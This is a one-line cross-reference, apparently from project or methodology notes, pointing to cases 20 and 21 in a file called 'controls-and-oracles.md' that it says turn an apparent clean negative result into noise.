  -> `controls-and-oracles.md` Cases 20 and 21. Both turn an apparent clean negative into noise.
